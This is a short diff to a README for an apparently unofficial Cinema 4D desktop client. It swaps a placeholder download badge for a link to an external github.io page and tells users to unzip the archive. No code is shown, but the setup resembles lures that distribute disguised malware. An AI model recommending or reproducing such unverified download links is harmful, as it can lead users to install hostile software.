@@ -6,7 +6,7 @@ This unofficial Cinema 4D desktop client brings the industry-leading 3D modeling
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cinema-4d-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
